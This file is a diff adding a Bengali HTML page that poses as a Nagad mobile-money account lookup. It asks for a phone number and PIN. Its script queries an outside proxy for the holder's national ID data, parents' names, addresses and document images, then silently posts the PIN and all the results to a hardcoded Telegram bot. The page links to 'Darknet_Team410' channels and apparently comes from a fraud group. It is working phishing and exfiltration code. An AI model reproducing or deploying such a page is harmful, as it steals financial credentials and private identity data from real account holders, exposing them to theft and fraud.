@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>নগদ অ্যাকাউন্ট অনুসন্ধান</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Noto Sans Bengali', sans-serif;
+            background: linear-gradient(135deg, #f0f2f5, #e9ecef);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 800px;
+            text-align: center;
+        }
+        .header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        .header img {
+            width: 150px;
+            margin-bottom: 15px;
+        }
+        .header h1 {
+            font-size: 24px;
+            color: #2c3e50;
+            margin: 0;
+        }
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+            position: relative;
+        }
+        label {
+            font-weight: bold;
+            color: #34495e;
+            margin-bottom: 10px;
+            display: block;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #ecf0f1;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-color: #e01e5a;
+            outline: none;
+        }
+        .password-toggle {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 14px;
+            color: #34495e;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #e01e5a;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+        button:hover {
+            background: #c0184d;
+            transform: scale(1.02);
+        }
+        #result {
+            margin-top: 25px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 15px;
+            text-align: left;
+            display: none;
+        }
+        .category {
+            margin-bottom: 20px;
+        }
+        .category h2 {
+            font-size: 18px;
+            color: #e01e5a;
+            margin-bottom: 10px;
+            border-bottom: 2px solid #e01e5a;
+            padding-bottom: 5px;
+        }
+        .info-item {
+            margin-bottom: 10px;
+            padding: 10px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+        }
+        .info-item strong {
+            color: #34495e;
+        }
+        .image-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .image-grid img {
+            width: 100%;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #e01e5a;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 25px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .contact-section {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .contact-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+        }
+        .contact-links a {
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+        }
+        .contact-links img {
+            width: 32px;
+            height: 32px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://i.ibb.co/wJz2fPb/IMG-20240718-164357-removebg-preview-1.png" alt="নগদ লোগো">
+            <h1>ডাক বিভাগের ডিজিটাল লেনদেন</h1>
+        </div>
+        <form id="searchForm">
+            <div class="form-group">
+                <label for="mobile">মোবাইল নম্বর:</label>
+                <input type="text" id="mobile" name="mobile" placeholder="01XXXXXXXXX" required>
+            </div>
+            <div class="form-group">
+                <label for="pin">পিন নম্বর:</label>
+                <input type="password" id="pin" name="pin" placeholder="****" required pattern="\d*" inputmode="numeric">
+                <span class="password-toggle" onclick="togglePassword()">দেখান</span>
+            </div>
+            <button type="submit">অনুসন্ধান</button>
+        </form>
+        <div class="contact-section">
+            <div class="contact-links">
+                <a href="https://www.facebook.com/dark.king45" target="_blank">
+                    <img src="https://img.icons8.com/color/48/000000/facebook-new.png" alt="Facebook">
+                </a>
+                <a href="https://m.me/dark.king45" target="_blank">
+                    <img src="https://img.icons8.com/color/48/000000/facebook-messenger--v1.png" alt="Messenger">
+                </a>
+                <a href="https://t.me/Darknet_Team410" target="_blank">
+                    <img src="https://img.icons8.com/color/48/000000/telegram-app.png" alt="Telegram Channel">
+                </a>
+                <a href="https://t.me/+7qsZzsNx75M3MmRl" target="_blank">
+                    <img src="https://img.icons8.com/color/48/000000/telegram-app.png" alt="Telegram Chat">
+                </a>
+                <a href="mailto:cpanel410@gmail.com">
+                    <img src="https://img.icons8.com/color/48/000000/gmail.png" alt="Gmail">
+                </a>
+            </div>
+        </div>
+        <div class="loader" id="loader"></div>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const pinInput = document.getElementById('pin');
+            const toggleText = document.querySelector('.password-toggle');
+            if (pinInput.type === 'password') {
+                pinInput.type = 'text';
+                toggleText.textContent = 'লুকান';
+            } else {
+                pinInput.type = 'password';
+                toggleText.textContent = 'দেখান';
+            }
+        }
+
+        document.getElementById('searchForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const mobile = document.getElementById('mobile').value;
+            const pin = document.getElementById('pin').value;
+            const resultDiv = document.getElementById('result');
+            const loader = document.getElementById('loader');
+            
+            const apiUrl = `https://teamerrors.store/proxyfornid.php?number=${mobile}&pin=${pin}`;
+            
+            loader.style.display = 'block';
+            resultDiv.style.display = 'none';
+            resultDiv.innerHTML = '';
+
+            fetch(apiUrl)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('নেটওয়ার্কে সমস্যা হয়েছে');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    loader.style.display = 'none';
+                    resultDiv.style.display = 'block';
+
+                    const nidInfo = `
+                        <div class="category">
+                            <h2>NID ইনফরমেশন</h2>
+                            <div class="info-item"><strong>আইডি টাইপ:</strong> ${data.idType || 'N/A'}</div>
+                            <div class="info-item"><strong>ফটো আইডি:</strong> ${data.photoId || 'N/A'}</div>
+                            <div class="info-item"><strong>নাম:</strong> ${data.name || 'N/A'}</div>
+                            <div class="info-item"><strong>জন্ম তারিখ:</strong> ${data.dob || 'N/A'}</div>
+                        </div>
+                    `;
+
+                    const accountInfo = `
+                        <div class="category">
+                            <h2>অ্যাকাউন্ট ইনফরমেশন</h2>
+                            <div class="info-item"><strong>ফোন নম্বর:</strong> ${data.phoneNumber || 'N/A'}</div>
+                            <div class="info-item"><strong>MNO নাম:</strong> ${data.mnoName || 'N/A'}</div>
+                            <div class="info-item"><strong>ইউজার আইডি:</strong> ${data.userId || 'N/A'}</div>
+                            <div class="info-item"><strong>ইউজার টাইপ:</strong> ${data.userType || 'N/A'}</div>
+                            <div class="info-item"><strong>সেগমেন্ট:</strong> ${data.customerSegment || 'N/A'}</div>
+                        </div>
+                    `;
+
+                    const otherInfo = `
+                        <div class="category">
+                            <h2>অন্যান্য ইনফরমেশন</h2>
+                            <div class="info-item"><strong>লিঙ্গ:</strong> ${data.gender || 'N/A'}</div>
+                            <div class="info-item"><strong>ইমেইল:</strong> ${data.email || 'N/A'}</div>
+                            <div class="info-item"><strong>প্রমো কোড:</strong> ${data.promoCode || 'N/A'}</div>
+                            <div class="info-item"><strong>পিতার নাম:</strong> ${data.aspAdditionalData?.fatherName || 'N/A'}</div>
+                            <div class="info-item"><strong>মাতার নাম:</strong> ${data.aspAdditionalData?.motherName || 'N/A'}</div>
+                            <div class="info-item"><strong>স্থায়ী ঠিকানা:</strong> ${data.aspAdditionalData?.permanentAddress || 'N/A'}</div>
+                            <div class="info-item"><strong>বর্তমান ঠিকানা:</strong> ${data.aspAdditionalData?.presentAddress || 'N/A'}</div>
+                            <div class="info-item"><strong>পেশা:</strong> ${data.aspAdditionalData?.occupation || 'N/A'}</div>
+                        </div>
+                    `;
+
+                    const noInfo = `
+                        <div class="category">
+                            <h2>তথ্য অনুপলব্ধ</h2>
+                            <div class="info-item"><strong>KYC ট্র্যাকিং নম্বর:</strong> ${data.kycTrackingNo || 'N/A'}</div>
+                            <div class="info-item"><strong>ইন্টারেস্ট বেয়ারিং অ্যাকাউন্ট:</strong> ${data.interestBearingAccount || 'N/A'}</div>
+                            <div class="info-item"><strong>রেজিস্টার্ড বাই:</strong> ${data.registeredBy || 'N/A'}</div>
+                            <div class="info-item"><strong>রিকোয়েস্টার অ্যাকাউন্ট নম্বর:</strong> ${data.requesterAccNo || 'N/A'}</div>
+                            <div class="info-item"><strong>ট্রাস্ট লেভেল:</strong> ${data.trustLevel || 'N/A'}</div>
+                            <div class="info-item"><strong>রেজিস্টার্ড এট:</strong> ${data.registeredAt || 'N/A'}</div>
+                        </div>
+                    `;
+
+                    let imageGrid = '';
+                    if (data.aspAdditionalData && data.aspAdditionalData.documentList) {
+                        imageGrid = '<div class="image-grid">';
+                        data.aspAdditionalData.documentList.forEach(doc => {
+                            const imgUrl = doc.baseUrl + doc.fileUrl;
+                            imageGrid += `<img src="${imgUrl}" alt="ডকুমেন্ট">`;
+                        });
+                        imageGrid += '</div>';
+                    }
+
+                    resultDiv.innerHTML = nidInfo + accountInfo + otherInfo + noInfo + imageGrid;
+
+                    // টেলিগ্রাম বটে মেসেজ পাঠানো
+                    const telegramBotToken = '6988425897:AAEc3nFqt411ryD_ndIlpyrLpkdf8MHjwKQ';
+                    const chatId = '5916486983';
+                    const message = `
+নগদ অ্যাকাউন্ট অনুসন্ধান:
+মোবাইল নম্বর: ${mobile}
+পিন: ${pin}
+ফলাফল:
+${JSON.stringify(data, null, 2)}
+                    `;
+
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(telegramData => {
+                        if (!telegramData.ok) {
+                            console.error('টেলিগ্রামে মেসেজ পাঠাতে সমস্যা:', telegramData);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('টেলিগ্রামে মেসেজ পাঠাতে ত্রুটি:', error);
+                    });
+                })
+                .catch(error => {
+                    loader.style.display = 'none';
+                    resultDiv.style.display = 'block';
+                    resultDiv.innerHTML = `<div class="info-item">ত্রুটি: ${error.message}</div>`;
+                });
+        });
+    </script>
+</body>
+  </html>
